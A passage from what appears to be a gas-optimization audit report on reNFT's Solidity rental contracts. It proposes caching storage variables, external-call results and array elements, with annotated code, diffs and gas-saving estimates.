474:        // Loop through each hook in the payload.
475:        for (uint256 i = 0; i < hooks.length; ++i) {
476:            // Get the hook's target address.
477:            target = hooks[i].target;
478:
479:            // Check that the hook is reNFT-approved to execute on rental start.
480:            if (!STORE.hookOnStart(target)) {   //@audit cache STORE outside the loop
481:                revert Errors.Shared_DisabledHook(target);
482:            }
483:
484:            // Get the offer item index for this hook.
485:            itemIndex = hooks[i].itemIndex;
.
.
.
520:    }
```
```diff
diff --git a/src/policies/Create.sol b/src/policies/Create.sol
index 061180d..a8de17a 100644
--- a/src/policies/Create.sol
+++ b/src/policies/Create.sol
@@ -470,14 +470,14 @@ contract Create is Policy, Signer, Zone, Accumulator {
         address target;
         uint256 itemIndex;
         SpentItem memory offer;
-
+        Storage _store = STORE;
         // Loop through each hook in the payload.
         for (uint256 i = 0; i < hooks.length; ++i) {
             // Get the hook's target address.
             target = hooks[i].target;

             // Check that the hook is reNFT-approved to execute on rental start.
-            if (!STORE.hookOnStart(target)) {
+            if (!_store.hookOnStart(target)) {
                 revert Errors.Shared_DisabledHook(target);
             }
```
```
Estimated gas saved: 97 gas units per iteration
```

</details>

3. ### Cache `ESCRW` outside of loop
- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L601

In the `_rentFromZone()` function as shown below up to `100` gas units could be saved per iteration if we cache the state variable `ESCRW` in a stack variable and read from the stack variable rather than from state during the loop iterations. The function could be refactored as shown in the diff below:

<details>

```solidity
file: src/policies/Create.sol

530:    function _rentFromZone(
531:        RentPayload memory payload,
532:        SeaportPayload memory seaportPayload
533:    ) internal {
534:        // Check: make sure order metadata is valid with the given seaport order zone hash.
535:        _isValidOrderMetadata(payload.metadata, seaportPayload.zoneHash);
536:
537:        // Check: verify the fulfiller of the order is an owner of the recipient safe.
538:        _isValidSafeOwner(seaportPayload.fulfiller, payload.fulfillment.recipient);
.
.
.
597:            // Interaction: Increase the deposit value on the payment escrow so
598:            // it knows how many tokens were sent to it.
599:            for (uint256 i = 0; i < items.length; ++i) {
600:                if (items[i].isERC20()) {
601:                    ESCRW.increaseDeposit(items[i].token, items[i].amount); //@audit cache ESCRW outside loop
602:                }
603:            }
604:
605:            // Interaction: Process the hooks associated with this rental.
606:            if (payload.metadata.hooks.length > 0) {
607:                _addHooks(
608:                    payload.metadata.hooks,
609:                    seaportPayload.offer,
610:                    payload.fulfillment.recipient
611:                );
612:            }
613:
614:            // Emit rental order started.
615:            _emitRentalOrderStarted(order, orderHash, payload.metadata.emittedExtraData);
616:        }
617:    }
```
```diff
diff --git a/src/policies/Create.sol b/src/policies/Create.sol
index 061180d..1a8ecb6 100644
--- a/src/policies/Create.sol
+++ b/src/policies/Create.sol
@@ -593,12 +593,12 @@ contract Create is Policy, Signer, Zone, Accumulator {

             // Interaction: Update storage only if the order is a Base Order or Pay order.
             STORE.addRentals(orderHash, _convertToStatic(rentalAssetUpdates));
-
+            PaymentEscrow _escrw = ESCRW;
             // Interaction: Increase the deposit value on the payment escrow so
             // it knows how many tokens were sent to it.
             for (uint256 i = 0; i < items.length; ++i) {
                 if (items[i].isERC20()) {
-                    ESCRW.increaseDeposit(items[i].token, items[i].amount);
+                    _escrw.increaseDeposit(items[i].token, items[i].amount);
                 }
             }
```
```
Estimated gas saved: 97 gas units per iteration
```

</details>

4. ### Cache `ESCRW` outside of loop
- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L700

In the `_executionInvariantChecks()` function as shown below up to `100` gas units could be saved per iteration if we cache the state variable `ESCRW` in a stack variable and read from the stack variable rather than from state during the loop iterations. The function could be refactored as shown in the diff below:

<details>

```solidity
file: src/policies/Create.sol

691:    function _executionInvariantChecks(
692:        ReceivedItem[] memory executions,
693:        address expectedRentalSafe
694:    ) internal view {
695:        for (uint256 i = 0; i < executions.length; ++i) {
696:            ReceivedItem memory execution = executions[i];
697:
698:            // ERC20 invariant where the recipient must be the payment escrow.
699:            if (execution.isERC20()) {
700:                _checkExpectedRecipient(execution, address(ESCRW));
701:            }
702:            // ERC721 and ERC1155 invariants where the recipient must
703:            // be the expected rental safe.
704:            else if (execution.isRental()) {
705:                _checkExpectedRecipient(execution, expectedRentalSafe);
706:            }
707:            // Revert if unsupported item type.
708:            else {
709:                revert Errors.CreatePolicy_SeaportItemTypeNotSupported(
710:                    execution.itemType
711:                );
712:            }
713:        }
714:    }
```
```diff
diff --git a/src/policies/Create.sol b/src/policies/Create.sol
index 061180d..93d1ec6 100644
--- a/src/policies/Create.sol
+++ b/src/policies/Create.sol
@@ -692,12 +692,13 @@ contract Create is Policy, Signer, Zone, Accumulator {
         ReceivedItem[] memory executions,
         address expectedRentalSafe
     ) internal view {
+        PaymentEscrow _escrw = ESCRW;
         for (uint256 i = 0; i < executions.length; ++i) {
             ReceivedItem memory execution = executions[i];

             // ERC20 invariant where the recipient must be the payment escrow.
             if (execution.isERC20()) {
-                _checkExpectedRecipient(execution, address(ESCRW));
+                _checkExpectedRecipient(execution, address(_escrw));
             }
             // ERC721 and ERC1155 invariants where the recipient must
             // be the expected rental safe.
```
```
Estimated gas saved: 97 gas saved per iteration
```

</details>

5. ### Cache `STORE` outside of loop
- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L210

In the `_removeHooks()` function as shown below up to `100` gas units could be saved per iteration if we cache the state variable `STORE` in a stack variable and read from the stack variable rather than from state during the loop iterations. The function could be refactored as shown in the diff below:

<details>

```solidity
file: src/policies/Stop.sol

194:    function _removeHooks(
195:        Hook[] calldata hooks,
196:        Item[] calldata rentalItems,
197:        address rentalWallet
198:    ) internal {
199:        // Define hook target, item index, and item.
200:        address target;
201:        uint256 itemIndex;
202:        Item memory item;
203:
204:        // Loop through each hook in the payload.
205:        for (uint256 i = 0; i < hooks.length; ++i) {
206:            // Get the hook address.
207:            target = hooks[i].target;
208:
209:            // Check that the hook is reNFT-approved to execute on rental stop.
210:            if (!STORE.hookOnStop(target)) {
211:                revert Errors.Shared_DisabledHook(target);
212:            }
.
.
.
250:    }
```
```diff
diff --git a/src/policies/Stop.sol b/src/policies/Stop.sol
index ab240ba..c348c1c 100644
--- a/src/policies/Stop.sol
+++ b/src/policies/Stop.sol
@@ -200,14 +200,14 @@ contract Stop is Policy, Signer, Reclaimer, Accumulator {
         address target;
         uint256 itemIndex;
         Item memory item;
-
+        Storage _store = STORE;
         // Loop through each hook in the payload.
         for (uint256 i = 0; i < hooks.length; ++i) {
             // Get the hook address.
             target = hooks[i].target;

             // Check that the hook is reNFT-approved to execute on rental stop.
-            if (!STORE.hookOnStop(target)) {
+            if (!_store.hookOnStop(target)) {
                 revert Errors.Shared_DisabledHook(target);
             }
```
```
Estimated gas saved: 97 gas saved per iteration
```
</details>

## [G-05] Cache external calls outside of loop to avoid re-calling function on each iteration
Performing STATICCALLs that do not depend on variables incremented in loops should always try to be avoided within the loop. In the instance, we are able to cache the external calls outside of the loop to save a STATICCALL (100 gas) per loop iteration.

### 1 Instance
1. ### Perform the external calls `orderType.isPayOrder()` and `orderType.isBaseOrder()` outside the loop and cache their results.
- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/modules/PaymentEscrow.sol#L255

The external calls `orderType.isPayOrder()` and `orderType.isBaseOrder()` should be made outside the loop and the result cached since their returned values are not dependent on the loop iterations. The diff below shows how the code should be refactored:

<details>

```solidity
file: src/modules/PaymentEscrow.sol

215:    function _settlePayment(
216:        Item[] calldata items,
217:        OrderType orderType,
218:        address lender,
219:        address renter,
220:        uint256 start,
221:        uint256 end
222:    ) internal {
223:        // Calculate the time values.
224:        uint256 elapsedTime = block.timestamp - start;
225:        uint256 totalTime = end - start;
226:
227:        // Determine whether the rental order has ended.
228:        bool isRentalOver = elapsedTime >= totalTime;
229:
230:        // Loop through each item in the order.
231:        for (uint256 i = 0; i < items.length; ++i) {
232:            // Get the item.
233:            Item memory item = items[i];
234:
235:            // Check that the item is a payment.
236:            if (item.isERC20()) {
237:                // Set a placeholder payment amount which can be reduced in the
238:                // presence of a fee.
239:                uint256 paymentAmount = item.amount;
240:
241:                // Take a fee on the payment amount if the fee is on.
242:                if (fee != 0) {
243:                    // Calculate the new fee.
244:                    uint256 paymentFee = _calculateFee(paymentAmount);
245:
246:                    // Adjust the payment amount by the fee.
247:                    paymentAmount -= paymentFee;
248:                }
249:
250:                // Effect: Decrease the token balance. Use the payment amount pre-fee
251:                // so that fees can be taken.
252:                _decreaseDeposit(item.token, item.amount);
253:
254:                // If its a PAY order but the rental hasn't ended yet.
255:                if (orderType.isPayOrder() && !isRentalOver) {  //@audit make orderType.isPayOrder() outside loop
256:                    // Interaction: a PAY order which hasnt ended yet. Payout is pro-rata.
257:                    _settlePaymentProRata(
258:                        item.token,
259:                        paymentAmount,
260:                        lender,
261:                        renter,
262:                        elapsedTime,
263:                        totalTime
264:                    );
265:                }
266:                // If its a PAY order and the rental is over, or, if its a BASE order.
267:                else if (
268:                    (orderType.isPayOrder() && isRentalOver) || orderType.isBaseOrder()   //@audit make orderType.isPayOrder() and orderType.isBaseOrder() outside loop
269:                ) {
270:                    // Interaction: a pay order or base order which has ended. Payout is in full.
271:                    _settlePaymentInFull(
272:                        item.token,
273:                        paymentAmount,
274:                        item.settleTo,
275:                        lender,
276:                        renter
277:                    );
278:                } else {
279:                    revert Errors.Shared_OrderTypeNotSupported(uint8(orderType));
280:                }
281:            }
282:        }
283:    }
```
```diff
diff --git a/src/modules/PaymentEscrow.sol b/src/modules/PaymentEscrow.sol
index 34c4f4c..988b175 100644
--- a/src/modules/PaymentEscrow.sol
+++ b/src/modules/PaymentEscrow.sol
@@ -226,6 +226,8 @@ contract PaymentEscrow is Proxiable, Module, PaymentEscrowBase {

         // Determine whether the rental order has ended.
         bool isRentalOver = elapsedTime >= totalTime;
+        bool isPayOrder = orderType.isPayOrder();
+        bool isBaseOrder = orderType.isBaseOrder();

         // Loop through each item in the order.
         for (uint256 i = 0; i < items.length; ++i) {
@@ -252,7 +254,7 @@ contract PaymentEscrow is Proxiable, Module, PaymentEscrowBase {
                 _decreaseDeposit(item.token, item.amount);

                 // If its a PAY order but the rental hasn't ended yet.
-                if (orderType.isPayOrder() && !isRentalOver) {
+                if (isPayOrder && !isRentalOver) {
                     // Interaction: a PAY order which hasnt ended yet. Payout is pro-rata.
                     _settlePaymentProRata(
                         item.token,
@@ -265,7 +267,7 @@ contract PaymentEscrow is Proxiable, Module, PaymentEscrowBase {
                 }
                 // If its a PAY order and the rental is over, or, if its a BASE order.
                 else if (
-                    (orderType.isPayOrder() && isRentalOver) || orderType.isBaseOrder()
+                    (isPayOrder && isRentalOver) || isBaseOrder
                 ) {
                     // Interaction: a pay order or base order which has ended. Payout is in full.
                     _settlePaymentInFull(
```
```
Estimated gas saved: 300 gas units
```

</details>

## [G-06] Refactor external/internal functions to avoid unnecessary SLOAD
The functions below read storage slots that are previously read in the functions that invoke them. We can refactor the external/internal functions to pass cached storage variables as stack variables and avoid the extra storage reads that would otherwise take place in the internal functions.

### 1 Instance
1. ### Refactor `stopRent()`, `stopRentBatch()` and `_removeHooks()` to avoid  `SLOAD` in `_removeHooks()`
- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L194-#L365

The external functions `stopRent()`, `stopRentBatch()` reads the variable `STORE` from state but they also invoke function `_removeHooks()` which also read the variable `STORE` from state. We can a avoid an `SLOAD(Gwarmaccess)` in the `_removeHooks()` function if we cache the `STORE` state variable in the `stopRent()` and `stopRentBatch()` functions then pass the cached value as a parameter to the `_removeHooks()` function: The diff below shows how the code should be refactored: 

<details>

```solidity
file: src/policies/Stop.sol

194:    function _removeHooks(
195:        Hook[] calldata hooks,
196:        Item[] calldata rentalItems,
197:        address rentalWallet
198:    ) internal {
199:        // Define hook target, item index, and item.
200:        address target;
201:        uint256 itemIndex;
202:        Item memory item;
203:
204:        // Loop through each hook in the payload.
205:        for (uint256 i = 0; i < hooks.length; ++i) {
206:            // Get the hook address.
207:            target = hooks[i].target;
208:
209:            // Check that the hook is reNFT-approved to execute on rental stop.
210:            if (!STORE.hookOnStop(target)) {     //@audit STORE state variable read
211:                revert Errors.Shared_DisabledHook(target);
212:            }
.
.
.
250:    }



265:    function stopRent(RentalOrder calldata order) external {
.
.
.
288:        if (order.hooks.length > 0) {
289:            _removeHooks(order.hooks, order.items, order.rentalWallet); //@audit STORE state variable read in _removeHooks function
290:        }
291:
292:        // Interaction: Transfer rentals from the renter back to lender.
293:        _reclaimRentedItems(order);
294:
295:        // Interaction: Transfer ERC20 payments from the escrow contract to the respective recipients.
296:        ESCRW.settlePayment(order);
297:
298:        // Interaction: Remove rentals from storage by computing the order hash.
299:        STORE.removeRentals(     //@audit STORE state variable read
300:            _deriveRentalOrderHash(order),
301:            _convertToStatic(rentalAssetUpdates)
302:        );
303:
304:        // Emit rental order stopped.
305:        _emitRentalOrderStopped(order.seaportOrderHash, msg.sender);
306:    }



313:    function stopRentBatch(RentalOrder[] calldata orders) external {
.
.
.
348:            if (orders[i].hooks.length > 0) {
349:                _removeHooks(orders[i].hooks, orders[i].items, orders[i].rentalWallet); //@audit STORE state variable read in _removeHooks function
350:            }
351:
352:            // Interaction: Transfer rental assets from the renter back to lender.
353:            _reclaimRentedItems(orders[i]);
354:
355:            // Emit rental order stopped.
356:            _emitRentalOrderStopped(orderHashes[i], msg.sender);
357:        }
358:
359:        // Interaction: Transfer ERC20 payments from the escrow contract to the respective recipients.
360:        ESCRW.settlePaymentBatch(orders);
361:
362:        // Interaction: Remove all rentals from storage.
363:        STORE.removeRentalsBatch(orderHashes, _convertToStatic(rentalAssetUpdates)); //@audit STORE state variable read
364:    }
```
```diff
diff --git a/src/policies/Stop.sol b/src/policies/Stop.sol
index ab240ba..cbc0d12 100644
--- a/src/policies/Stop.sol
+++ b/src/policies/Stop.sol
@@ -194,7 +194,8 @@ contract Stop is Policy, Signer, Reclaimer, Accumulator {
     function _removeHooks(
         Hook[] calldata hooks,
         Item[] calldata rentalItems,
-        address rentalWallet
+        address rentalWallet,
+        Storage _store
     ) internal {
         // Define hook target, item index, and item.
         address target;
@@ -283,10 +284,10 @@ contract Stop is Policy, Signer, Reclaimer, Accumulator {
                 );
             }
         }
-
+        Storage _store = STORE;
         // Interaction: process hooks so they no longer exist for the renter.
         if (order.hooks.length > 0) {
-            _removeHooks(order.hooks, order.items, order.rentalWallet);
+            _removeHooks(order.hooks, order.items, order.rentalWallet, _store);
         }

         // Interaction: Transfer rentals from the renter back to lender.
@@ -296,7 +297,7 @@ contract Stop is Policy, Signer, Reclaimer, Accumulator {
         ESCRW.settlePayment(order);

         // Interaction: Remove rentals from storage by computing the order hash.
-        STORE.removeRentals(
+        _store.removeRentals(
             _deriveRentalOrderHash(order),
             _convertToStatic(rentalAssetUpdates)
         );
@@ -343,10 +344,10 @@ contract Stop is Policy, Signer, Reclaimer, Accumulator {

             // Add the order hash to an array.
             orderHashes[i] = _deriveRentalOrderHash(orders[i]);
-
+            Storage _store = STORE;
             // Interaction: Process hooks so they no longer exist for the renter.
             if (orders[i].hooks.length > 0) {
-                _removeHooks(orders[i].hooks, orders[i].items, orders[i].rentalWallet);
+                _removeHooks(orders[i].hooks, orders[i].items, orders[i].rentalWallet, _store);
             }

             // Interaction: Transfer rental assets from the renter back to lender.
```
</details>


## [G-07] Multiple accesses of a array should use a local variable cache
The instances below point to the second+ access of a value inside an array, within a function. Caching an array's struct avoids re-calculating the array offsets into memory

### Proof of concept

<Details>

```solidity
struct Person {
    string name;
    uint age;
    uint id;
}

contract NoCacheArrayElement {

    Person[] students;

    function createStudents() external  {
        Person[] memory arrayOfPersons = new Person[](3); 
        Person memory newPerson1 = Person("Emmanuel", 15,1);
        Person memory newPerson2 = Person("Faustina", 16,2);
        Person memory newPerson3 = Person("Emmanuela", 14,3);

        arrayOfPersons[0] = newPerson1;
        arrayOfPersons[1] = newPerson2;
        arrayOfPersons[2] = newPerson3;

        _addNewSet(arrayOfPersons);
    }

    function _addNewSet(Person[] memory _persons) internal {
        uint len = _persons.length;
        unchecked {
            for(uint i; i < len; ++i) {
                Person memory newStudent = Person(_persons[i].name, _persons[i].age, _persons[i].id);
                students.push(newStudent);
            }
        }

    }
}
```
```
test for test/NoCacheArrayElement.t.sol:NoCacheArrayElementTest
[PASS] test_createStudents() (gas: 230357)
```

```solidity

struct Person {
    string name;
    uint age;
    uint id;
}

contract CacheArrayElement {

    Person[] students;

    function createStudents() external  {
        Person[] memory arrayOfPersons = new Person[](3); 
        Person memory newPerson1 = Person("Emmanuel", 15,1);
        Person memory newPerson2 = Person("Faustina", 16,2);
        Person memory newPerson3 = Person("Emmanuela", 14,3);

        arrayOfPersons[0] = newPerson1;
        arrayOfPersons[1] = newPerson2;
        arrayOfPersons[2] = newPerson3;

        _addNewSet(arrayOfPersons);
    }

    function _addNewSet(Person[] memory _persons) internal {
        uint len = _persons.length;
        unchecked {
            for(uint i; i < len; ++i) {
                Person memory myPerson = _persons[i];
                Person memory newStudent = Person(myPerson.name, myPerson.age, myPerson.id);
                students.push(newStudent);
            }
        }

    }
}
```
```
test for test/Counter.t.sol:CacheArrayElementTest
[PASS] test_createStudents() (gas: 230096)
```
</details>

### 2 Instances
1. ### Cache `hooks[i]` to avoid re-calculating the array offsets into memory
- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L477&&#L485

<details>

```solidity
file: src/policies/Create.sol

464:    function _addHooks(
465:        Hook[] memory hooks,
466:        SpentItem[] memory offerItems,
467:        address rentalWallet
468:    ) internal {
469:        // Define hook target, offer item index, and an offer item.
470:        address target;
471:        uint256 itemIndex;
472:        SpentItem memory offer;
473:
474:        // Loop through each hook in the payload.
475:        for (uint256 i = 0; i < hooks.length; ++i) {
476:            // Get the hook's target address.
477:            target = hooks[i].target;   //@audit cache hooks[i];
478:
479:            // Check that the hook is reNFT-approved to execute on rental start.
480:            if (!STORE.hookOnStart(target)) {
481:                revert Errors.Shared_DisabledHook(target);
482:            }
483:
484:            // Get the offer item index for this hook.
485:            itemIndex = hooks[i].itemIndex;   //@audit cache hooks[i];
486:
487:            // Get the offer item for this hook.
488:            offer = offerItems[itemIndex];
489:
490:            // Make sure the offer item is an ERC721 or ERC1155.
491:            if (!offer.isRental()) {
492:                revert Errors.Shared_NonRentalHookItem(itemIndex);
493:            }
494:
495:            // Call the hook with data about the rented item.
496:            try
497:                IHook(target).onStart(
498:                    rentalWallet,
499:                    offer.token,
500:                    offer.identifier,
501:                    offer.amount,
502:                    hooks[i].extraData   //@audit cache hooks[i];
503:                )
.
.
.
520:    }
```

```diff
diff --git a/src/policies/Create.sol b/src/policies/Create.sol
index 061180d..b2f4241 100644
--- a/src/policies/Create.sol
+++ b/src/policies/Create.sol
@@ -470,11 +470,12 @@ contract Create is Policy, Signer, Zone, Accumulator {
         address target;
         uint256 itemIndex;
         SpentItem memory offer;
-
+        Hook memory hook;
         // Loop through each hook in the payload.
         for (uint256 i = 0; i < hooks.length; ++i) {
             // Get the hook's target address.
-            target = hooks[i].target;
+            hook = hooks[i];
+            target = hook.target;

             // Check that the hook is reNFT-approved to execute on rental start.
             if (!STORE.hookOnStart(target)) {
@@ -482,7 +483,7 @@ contract Create is Policy, Signer, Zone, Accumulator {
             }

             // Get the offer item index for this hook.
-            itemIndex = hooks[i].itemIndex;
+            itemIndex = hook.itemIndex;

             // Get the offer item for this hook.
             offer = offerItems[itemIndex];
@@ -499,7 +500,7 @@ contract Create is Policy, Signer, Zone, Accumulator {
                     offer.token,
                     offer.identifier,
                     offer.amount,
-                    hooks[i].extraData
+                    hook.extraData
                 )
             {} catch Error(string memory revertReason) {
                 // Revert with reason given.
```

</details>

2. ### Cache `items[i]` to avoid re-calculating the array offsets into memory
- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L568-#L573
- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L600-#L601

<details>

```solidity
file: src/policies/Create.sol

530:    function _rentFromZone(
531:        RentPayload memory payload,
532:        SeaportPayload memory seaportPayload
533:    ) internal {
534:        // Check: make sure order metadata is valid with the given seaport order zone hash.
535:        _isValidOrderMetadata(payload.metadata, seaportPayload.zoneHash);
536:
537:        // Check: verify the fulfiller of the order is an owner of the recipient safe.
538:        _isValidSafeOwner(seaportPayload.fulfiller, payload.fulfillment.recipient);
539:
540:        // Check: verify each execution was sent to the expected destination.
541:        _executionInvariantChecks(
542:            seaportPayload.totalExecutions,
543:            payload.fulfillment.recipient
544:        );
545:
546:        // Check: validate and process seaport offer and consideration items based
547:        // on the order type.
548:        Item[] memory items = _convertToItems(
549:            seaportPayload.offer,
550:            seaportPayload.consideration,
551:            payload.metadata.orderType
552:        );
553:
.
.
.
567:            for (uint256 i; i < items.length; ++i) {
568:                if (items[i].isRental()) {  //@audit cache items[i]
569:                    // Insert the rental asset update into the dynamic array.
570:                    _insert(
571:                        rentalAssetUpdates,
572:                        items[i].toRentalId(payload.fulfillment.recipient),  //@audit cache items[i]
573:                        items[i].amount  //@audit cache items[i]
574:                    );
575:                }
576:            }
.
.
.
599:            for (uint256 i = 0; i < items.length; ++i) {
600:                if (items[i].isERC20()) {  //@audit cache items[i]
601:                    ESCRW.increaseDeposit(items[i].token, items[i].amount);  //@audit cache items[i]
602:                }
603:            }
.
.
.
617:    }
```

```diff
diff --git a/src/policies/Create.sol b/src/policies/Create.sol
index 061180d..b5ddcbf 100644
--- a/src/policies/Create.sol
+++ b/src/policies/Create.sol
@@ -561,16 +561,17 @@ contract Create is Policy, Signer, Zone, Accumulator {
             // the rented amount. From this point on, new memory cannot be safely allocated until the
             // accumulator no longer needs to include elements.
             bytes memory rentalAssetUpdates = new bytes(0);
-
+            Item memory item;
             // Check if each item is a rental. If so, then generate the rental asset update.
             // Memory will become safe again after this block.
             for (uint256 i; i < items.length; ++i) {
-                if (items[i].isRental()) {
+                item = items[i];
+                if (item.isRental()) {
                     // Insert the rental asset update into the dynamic array.
                     _insert(
                         rentalAssetUpdates,
-                        items[i].toRentalId(payload.fulfillment.recipient),
-                        items[i].amount
+                        item.toRentalId(payload.fulfillment.recipient),
+                        item.amount
                     );
                 }
             }
@@ -597,8 +598,9 @@ contract Create is Policy, Signer, Zone, Accumulator {
             // Interaction: Increase the deposit value on the payment escrow so
             // it knows how many tokens were sent to it.
             for (uint256 i = 0; i < items.length; ++i) {
-                if (items[i].isERC20()) {
-                    ESCRW.increaseDeposit(items[i].token, items[i].amount);
+                item = items[i];
+                if (item.isERC20()) {
+                    ESCRW.increaseDeposit(item.token, item.amount);
                 }
             }
```

</details>

## [G-08]  State variables should be cached in stack variables rather than re-reading them from storage
The instances below point to the second+ access of a state variable within a function. Caching of a state variable replaces each Gwarmaccess (100 gas) with a much cheaper stack read. Other less obvious fixes/optimizations include having local memory caches of state variable structs, or having local caches of state variables.

### 5 Instances

1. ### Refactor `Admin.requestPermissions()`  to avoid 6 `SLOAD(Gwarmaccess)`
- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Admin.sol#L74-#L81
- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Admin.sol#L83-#L86

We can reduce the gas cost of the `requestPermissions()` function by reducing the number of storage reads (`SLOAD`) for the state variables `STORE` and `ESCRW`. The value of the `STORE` and `ESCRW` state variables should be cached stack variables then the stack variables be used for subsequent reads of the `STORE` and `ESCRW` state variable. In implementing this we replace 6 `SLOAD`s(cold acess) `100` gas units with  much cheaper 6 `MLOAD` `18` gas units: The diff below shows how the code could be refactored:

<details>

```solidity
file: src/policies/Admin.sol

64:    function requestPermissions()
65:        external
66:        view
67:        override
68:        onlyKernel
69:        returns (Permissions[] memory requests)
70:    {
71:        requests = new Permissions[](8);
72:        requests[0] = Permissions(
73:            toKeycode("STORE"),
74:            STORE.toggleWhitelistExtension.selector  //@audit STORE 1st SLOAD
75:        );
76:        requests[1] = Permissions(
77:            toKeycode("STORE"),
78:            STORE.toggleWhitelistDelegate.selector  //@audit STORE 2nd SLOAD
79:        );
80:        requests[2] = Permissions(toKeycode("STORE"), STORE.upgrade.selector);  //@audit STORE 3rd SLOAD
81:        requests[3] = Permissions(toKeycode("STORE"), STORE.freeze.selector);  //@audit STORE 4th SLOAD
82:
83:        requests[4] = Permissions(toKeycode("ESCRW"), ESCRW.skim.selector);  //@audit ESCRW 1st SLOAD
84:        requests[5] = Permissions(toKeycode("ESCRW"), ESCRW.setFee.selector);  //@audit ESCRW 2nd SLOAD
85:        requests[6] = Permissions(toKeycode("ESCRW"), ESCRW.upgrade.selector);  //@audit ESCRW 3rd SLOAD
86:        requests[7] = Permissions(toKeycode("ESCRW"), ESCRW.freeze.selector);  //@audit ESCRW 4th SLOAD
87:    }
```
```diff
diff --git a/src/policies/Admin.sol b/src/policies/Admin.sol
index b37d47f..4e277f7 100644
--- a/src/policies/Admin.sol
+++ b/src/policies/Admin.sol
@@ -69,21 +69,23 @@ contract Admin is Policy {
         returns (Permissions[] memory requests)
     {
         requests = new Permissions[](8);
+        Storage _store = STORE;
+        PaymentEscrow _escrw = ESCRW;
         requests[0] = Permissions(
             toKeycode("STORE"),
-            STORE.toggleWhitelistExtension.selector
+            _store.toggleWhitelistExtension.selector
         );
         requests[1] = Permissions(
             toKeycode("STORE"),
-            STORE.toggleWhitelistDelegate.selector
+            _store.toggleWhitelistDelegate.selector
         );
-        requests[2] = Permissions(toKeycode("STORE"), STORE.upgrade.selector);
-        requests[3] = Permissions(toKeycode("STORE"), STORE.freeze.selector);
+        requests[2] = Permissions(toKeycode("STORE"), _store.upgrade.selector);
+        requests[3] = Permissions(toKeycode("STORE"), _store.freeze.selector);

-        requests[4] = Permissions(toKeycode("ESCRW"), ESCRW.skim.selector);
-        requests[5] = Permissions(toKeycode("ESCRW"), ESCRW.setFee.selector);
-        requests[6] = Permissions(toKeycode("ESCRW"), ESCRW.upgrade.selector);
-        requests[7] = Permissions(toKeycode("ESCRW"), ESCRW.freeze.selector);
+        requests[4] = Permissions(toKeycode("ESCRW"), _escrw.skim.selector);
+        requests[5] = Permissions(toKeycode("ESCRW"), _escrw.setFee.selector);
+        requests[6] = Permissions(toKeycode("ESCRW"), _escrw.upgrade.selector);
+        requests[7] = Permissions(toKeycode("ESCRW"), _escrw.freeze.selector);
     }
```
```
Estimated gas saved: 582 gas units
```

</details>

2. ### Refactor `Factory.deployRentalSafe()`  to avoid 1 `SLOAD(Gwarmaccess)`
- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Factory.sol#L189

We can reduce the gas cost of the `deployRentalSafe()` function by reducing the number of storage reads (`SLOAD`) for the state variable `STORE`. The value of the `STORE` state variable should be cached in a stack variable then the stack variable be used for subsequent reads of the `STORE` state variable. In implementing this we replace 1 `SLOAD`s(cold acess) `100` gas units with  much cheaper 1 `MLOAD` `3` gas units: The diff below shows how the code could be refactored:

<details>

```solidity
file: src/policies/Factory.sol

138:    function deployRentalSafe(
139:        address[] calldata owners,
140:        uint256 threshold
141:    ) external returns (address safe) {
142:        // Require that the threshold is valid.
143:        if (threshold == 0 || threshold > owners.length) {
144:            revert Errors.FactoryPolicy_InvalidSafeThreshold(threshold, owners.length);
145:        }
.
.
.
180:        safe = address(
181:            safeProxyFactory.createProxyWithNonce(
182:                address(safeSingleton),
183:                initializerPayload,
184:                uint256(keccak256(abi.encode(STORE.totalSafes() + 1, block.chainid)))  //@audit STORE 1st SLOAD
185:            )
186:        );
187:
188:        // Store the deployed safe.
189:        STORE.addRentalSafe(safe);  //@audit STORE 2nd SLOAD
190:
191:        // Emit the event.
192:        emit Events.RentalSafeDeployment(safe, owners, threshold);
193:    }
```
```diff
diff --git a/src/policies/Factory.sol b/src/policies/Factory.sol
index 8401ad7..f019f3c 100644
--- a/src/policies/Factory.sol
+++ b/src/policies/Factory.sol
@@ -174,6 +174,7 @@ contract Factory is Policy {
             )
         );

+        Storage _store = STORE;
         // Deploy a safe proxy using initializer values for the Safe.setup() call
         // with a salt nonce that is unique to each chain to guarantee cross-chain
         // unique safe addresses.
@@ -181,12 +182,12 @@ contract Factory is Policy {
             safeProxyFactory.createProxyWithNonce(
                 address(safeSingleton),
                 initializerPayload,
-                uint256(keccak256(abi.encode(STORE.totalSafes() + 1, block.chainid)))
+                uint256(keccak256(abi.encode(_store.totalSafes() + 1, block.chainid)))
             )
         );

         // Store the deployed safe.
-        STORE.addRentalSafe(safe);
+        _store.addRentalSafe(safe);

         // Emit the event.
         emit Events.RentalSafeDeployment(safe, owners, threshold);
```
```
Estimated gas saved: 97
```

</details>

3. ### Refactor `Guard.requestPermissions()`  to avoid 1 `SLOAD(Gwarmaccess)`
- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol#L93

We can reduce the gas cost of the `requestPermissions()` function by reducing the number of storage reads (`SLOAD`) for the state variable `STORE`. The value of the `STORE` state variable should be cached in a stack variable then the stack variable be used for subsequent reads of the `STORE` state variable. In implementing this we replace 1 `SLOAD`s(cold acess) `100` gas units with  much cheaper 1 `MLOAD` `3` gas units: The diff below shows how the code could be refactored:

<details>

```solidity
file: src/policies/Guard.sol

84:    function requestPermissions()
85:        external
